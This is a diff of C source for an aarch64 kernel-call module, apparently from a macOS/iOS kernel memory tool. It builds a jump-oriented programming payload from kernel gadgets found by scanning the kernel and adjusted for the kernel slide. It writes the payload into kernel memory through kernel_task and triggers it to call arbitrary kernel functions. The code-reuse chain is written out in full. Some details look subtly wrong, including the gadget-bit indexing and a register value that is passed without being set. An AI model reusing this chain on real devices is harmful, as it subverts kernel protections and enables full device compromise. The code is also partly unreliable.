@@ -235,7 +235,7 @@
  * Because the JOP_STACK is constant (only the data loaded from VALUE_STACK changes), it is
  * possible to set up the JOP payload in kernel memory during initialization, then overwrite the
  * function and arguments in the value stack as necessary. However, at least initially, we will
- * overwrite the full JOP payload on each function call. (TODO: Revisit this decision.)
+ * overwrite the full JOP payload on each function call.
  *
  * The JOP payload is laid out as follows:
  *
@@ -339,6 +339,12 @@
 
 #include <mach/mach_vm.h>
 
+_Static_assert(sizeof(kword_t) == sizeof(uint64_t),
+               "unexpected kernel word size for kernel_call_aarch64");
+
+// Get the size of an array.
+#define ARRSIZE(x)	(sizeof(x) / sizeof((x)[0]))
+
 /*
  * struct gadget
  *
@@ -437,33 +443,6 @@ enum {
 };
 
 /*
- * ngadgets
- *
- * Description:
- * 	The number of gadgets we have found so far.
- */
-static unsigned ngadgets;
-
-/*
- * jop_payload
- *
- * Description:
- * 	A block of kernel memory used to build the JOP payload.
- */
-static kaddr_t jop_payload;
-
-#define JOP_MEMORY_SIZE     0x400
-#define VALUE_STACK_OFFSET  0
-#define RESULT_OFFSET       0x9c
-#define STORE_RESUME_OFFSET 0
-#define JOP_STACK_OFFSET    0xe0
-#define LOAD_ADVANCE        0x34
-#define STORE_RESUME_DELTA  (-0x28)
-
-// Get the size of an array.
-#define ARRSIZE(x)	(sizeof(x) / sizeof((x)[0]))
-
-/*
  * find_gadgets_in_data
  *
  * Description:
@@ -487,42 +466,21 @@ find_gadgets_in_data(const void *data, uint64_t address, size_t size) {
 			// Found a gadget! Set the address.
 			g->address = address + (ins - (uint32_t *)data) * sizeof(*ins)
 			           + kernel_slide;
-			ngadgets++;
 		}
 	}
-}
-
-/*
- * check_gadgets
- *
- * Description:
- * 	Check to make sure that all the required gadgets are present.
- */
-static bool
-check_gadgets() {
-	for (struct gadget *g = gadgets; g < gadgets + GADGET_COUNT; g++) {
-		if (g->address == 0) {
-			error_functionality_unavailable(
-					"kernel_call_aarch64: gadget '%s' not found", g->str);
-			assert(ngadgets < GADGET_COUNT);
-			return false;
-		}
-	}
-	assert(ngadgets == GADGET_COUNT);
-	return true;
 }
 
 /*
  * find_gadgets
  *
  * Description:
- * 	Initialize the gadgets used for the JOP payload.
+ * 	Find whichever gadgets are present in the kernel.
  *
  * Notes:
  * 	We only scan the executable segments of the kernel Mach-O because all executable segments
  * 	of all kernel extensions lie within the kernel's __PLK_TEXT_EXEC segment.
  */
-static bool
+static void
 find_gadgets() {
 	const struct segment_command_64 *sc = NULL;
 	for (;;) {
@@ -541,21 +499,94 @@ find_gadgets() {
 		macho_segment_data_64(&kernel.macho, sc, &data, &address, &size);
 		find_gadgets_in_data(data, address, size);
 	}
-	return check_gadgets();
 }
 
 /*
- * build_jop_payload
+ * jop_payload
+ *
+ * Description:
+ * 	A page of kernel memory used for the JOP payload.
+ */
+static kaddr_t jop_payload;
+
+/*
+ * initial_state
+ *
+ * Description:
+ * 	A struct to keep track of register values when starting JOP.
+ */
+struct initial_state {
+	uint64_t pc;
+	uint64_t x[7];
+};
+
+/*
+ * build_jop_fn
+ *
+ * Description:
+ * 	A function to build a JOP payload and set up arguments to kernel_call_7.
+ *
+ * Parameters:
+ * 		func			The kernel function to call.
+ * 		args			The arguments to the kernel function.
+ * 	out	payload			On return, the JOP payload. This will be copied into the
+ * 					kernel at address jop_payload.
+ * 	out	initial_state		On return, the state of the CPU registers to at the start
+ * 					of JOP execution.
+ * 	out	result_address		On return, the address of the result value.
+ */
+typedef void (*build_jop_fn)(uint64_t func, const uint64_t args[8],
+		void *payload, struct initial_state *initial_state, uint64_t *result_address);
+
+/*
+ * struct strategy
+ *
+ * Description:
+ * 	A description of a JOP strategy.
+ */
+struct strategy {
+	uint64_t     gadgets[1];
+	size_t       payload_size;
+	build_jop_fn build_jop;
+};
+
+static void jop_1(uint64_t, const uint64_t[8], void *, struct initial_state *, uint64_t *);
+
+/*
+ * strategies
+ *
+ * Description:
+ * 	A list of all available strategies.
+ */
+const struct strategy strategies[] = {
+	{ { 0x03ffffff }, 0x400, jop_1 },
+};
+
+/*
+ * strategy
+ *
+ * Description:
+ * 	The chosen strategy.
+ */
+const struct strategy *strategy;
+
+/*
+ * jop_1
  *
  * Description:
  * 	Build the JOP payload described at the top of this file.
  */
-static bool
-build_jop_payload(uint64_t func, uint64_t args[8]) {
-	uint8_t payload[JOP_MEMORY_SIZE];
-	// Initialize unused bytes of the payload to a distinctive byte pattern to make detecting
-	// errors in panic logs easier.
-	memset(payload, 0xba, sizeof(payload));
+static void
+jop_1(uint64_t func, const uint64_t args[8],
+		void *payload0, struct initial_state *initial_state, uint64_t *result_address) {
+	const size_t VALUE_STACK_OFFSET  = 0;
+	const size_t RESULT_OFFSET       = 0x9c;
+	const size_t STORE_RESUME_OFFSET = 0;
+	const size_t JOP_STACK_OFFSET    = 0xe0;
+	const size_t LOAD_ADVANCE        = 0x34;
+	const int    STORE_RESUME_DELTA  = -0x28;
+
+	uint8_t *const payload = (uint8_t *)payload0;
 	// Set up STORE_RESUME.
 	uint64_t store_resume = jop_payload + STORE_RESUME_OFFSET;
 	uint64_t *store_resume_payload = (uint64_t *)(payload + STORE_RESUME_OFFSET);
@@ -619,13 +650,7 @@ build_jop_payload(uint64_t func, uint64_t args[8]) {
 		uint64_t x4;
 		uint64_t x5;
 		uint64_t x6;
-	} *load_gadget;
-	struct call_recover_gadget {
-		uint64_t pad[2];
-		uint64_t x8;
-		uint64_t x1;
-	} *call_recover_gadget;
-	load_gadget = (struct load_gadget *)(payload + VALUE_STACK_OFFSET);
+	} *load_gadget = (struct load_gadget *)(payload + VALUE_STACK_OFFSET);
 	load_gadget->x3 = gadgets[LDP_X8_X1_X20_10__BLR_X8].address;
 	load_gadget->x4 = gadgets[MOV_X30_X28__BR_X12].address;
 	load_gadget->x6 = store_resume;
@@ -642,36 +667,49 @@ build_jop_payload(uint64_t func, uint64_t args[8]) {
 	load_gadget->x4 = args[4];
 	load_gadget->x5 = args[5];
 	load_gadget->x6 = args[6];
-	call_recover_gadget = (struct call_recover_gadget *)((uint8_t *)load_gadget);
+	struct call_recover_gadget {
+		uint64_t pad[2];
+		uint64_t x8;
+		uint64_t x1;
+	} *call_recover_gadget = (struct call_recover_gadget *)((uint8_t *)load_gadget);
 	call_recover_gadget->x8 = gadgets[LDP_X2_X1_X1__BR_X2].address;
 	call_recover_gadget->x1 = jop_return_chain;
-	// Finally, write the payload into memory.
-	size_t size = JOP_MEMORY_SIZE;
-	kernel_io_result ior = kernel_write_unsafe(jop_payload, &size, payload, 0, NULL);
-	if (ior != KERNEL_IO_SUCCESS) {
-		error_internal("could not write JOP payload to kernel memory");
-		return false;
-	}
-	return true;
+	// Declare the initial state.
+	initial_state->pc = gadgets[MOV_X12_X2__BR_X3].address;
+	initial_state->x[0] = jop_payload + VALUE_STACK_OFFSET,
+	initial_state->x[1] = jop_payload + JOP_STACK_OFFSET,
+	initial_state->x[2] = gadgets[MOV_X8_X4__BR_X5].address,
+	initial_state->x[3] = gadgets[MOV_X2_X30__BR_X12].address,
+	initial_state->x[4] = gadgets[LDP_X2_X1_X1__BR_X2].address,
+	initial_state->x[5] = gadgets[MOV_X21_X2__BR_X8].address,
+	// Specify the result address.
+	*result_address = jop_payload + RESULT_OFFSET;
 }
 
 /*
- * get_result
+ * choose_strategy
  *
  * Description:
- * 	Read the result from the kernel function call.
+ * 	Choose a compatible JOP strategy.
  */
 static bool
-get_result(void *result, size_t result_size) {
-	uint64_t result64;
-	kernel_io_result ior = kernel_read_word(kernel_read_unsafe, jop_payload + RESULT_OFFSET,
-			&result64, sizeof(result64), 0);
-	if (ior != KERNEL_IO_SUCCESS) {
-		error_internal("could not read function call result from kernel memory");
-		return false;
+choose_strategy() {
+	for (strategy = &strategies[0]; strategy < strategies + ARRSIZE(strategies); strategy++) {
+		for (unsigned g = 0; g < GADGET_COUNT; g++) {
+			unsigned block = g % (8 * sizeof(*strategy->gadgets));
+			unsigned bit   = g & (8 * sizeof(*strategy->gadgets) - 1);
+			if (gadgets[g].address == 0 && testbit(strategy->gadgets[block], bit)) {
+				// This gadget is missing.
+				goto next;
+			}
+		}
+		// All gadgets were found!
+		return true;
+next:;
 	}
-	pack_uint(result, result64, result_size);
-	return true;
+	error_functionality_unavailable("kernel_call_aarch64: no available JOP strategy "
+	                                "for the gadgets present in this kernel");
+	return false;
 }
 
 bool
@@ -679,11 +717,12 @@ kernel_call_init_aarch64() {
 	if (jop_payload != 0) {
 		return true;
 	}
-	if (!find_gadgets()) {
+	find_gadgets();
+	if (!choose_strategy()) {
 		goto fail;
 	}
 	mach_vm_address_t address;
-	kern_return_t kr = mach_vm_allocate(kernel_task, &address, JOP_MEMORY_SIZE,
+	kern_return_t kr = mach_vm_allocate(kernel_task, &address, strategy->payload_size,
 			VM_FLAGS_ANYWHERE);
 	if (kr != KERN_SUCCESS) {
 		error_internal("mach_vm_allocate failed: %s", mach_error_string(kr));
@@ -699,7 +738,7 @@ fail:
 void
 kernel_call_deinit_aarch64() {
 	if (jop_payload != 0) {
-		mach_vm_deallocate(kernel_task, jop_payload, JOP_MEMORY_SIZE);
+		mach_vm_deallocate(kernel_task, jop_payload, strategy->payload_size);
 		jop_payload = 0;
 	}
 }
@@ -707,36 +746,43 @@ kernel_call_deinit_aarch64() {
 bool
 kernel_call_aarch64(void *result, unsigned result_size, unsigned arg_count,
 		kaddr_t func, kword_t args[]) {
-	assert(sizeof(kword_t) == sizeof(uint64_t));
 	if (func == 0) {
+		// Everything is supported.
 		return true;
 	}
-	uint64_t args64[8] = { 0 };
+	// Get exactly 8 arguments.
+	uint64_t args8[8] = { 0 };
 	for (size_t i = 0; i < arg_count; i++) {
-		args64[i] = args[i];
+		args8[i] = args[i];
 	}
-	if (!build_jop_payload(func, args64)) {
+	// Initialize unused bytes of the payload to a distinctive byte pattern to make detecting
+	// errors in panic logs easier.
+	size_t size = strategy->payload_size;
+	uint8_t payload[size];
+	memset(payload, 0xba, size);
+	// Build the payload.
+	struct initial_state initial_state;
+	uint64_t result_address;
+	strategy->build_jop(func, args8, payload, &initial_state, &result_address);
+	// Write the payload into kernel memory.
+	kernel_io_result ior = kernel_write_unsafe(jop_payload, &size, payload, 0, NULL);
+	if (ior != KERNEL_IO_SUCCESS) {
+		error_internal("could not write JOP payload to kernel memory");
 		return false;
 	}
-	kword_t kc7args[6] = {
-		jop_payload + VALUE_STACK_OFFSET,
-		jop_payload + JOP_STACK_OFFSET,
-		gadgets[MOV_X8_X4__BR_X5].address,
-		gadgets[MOV_X2_X30__BR_X12].address,
-		gadgets[LDP_X2_X1_X1__BR_X2].address,
-		gadgets[MOV_X21_X2__BR_X8].address,
-	};
-	kword_t pc = gadgets[MOV_X12_X2__BR_X3].address;
+	// Read the result from kernel memory.
 	uint32_t result32;
-	bool success = kernel_call_7(&result32, sizeof(result32), 6, pc, kc7args);
+	bool success = kernel_call_7(&result32, sizeof(result32), 7, initial_state.pc,
+			initial_state.x);
 	if (!success) {
 		return false;
 	}
-	if (result32 != ((jop_payload + STORE_RESUME_OFFSET) & 0xffffffff)) {
-		memctl_warning("unexpected return value %x from kernel_call_7", result32);
-	}
-	if (!get_result(result, result_size)) {
+	uint64_t result64;
+	ior = kernel_read_word(kernel_read_unsafe, result_address, &result64, sizeof(result64), 0);
+	if (ior != KERNEL_IO_SUCCESS) {
+		error_internal("could not read function call result from kernel memory");
 		return false;
 	}
+	pack_uint(result, result64, result_size);
 	return true;
 }
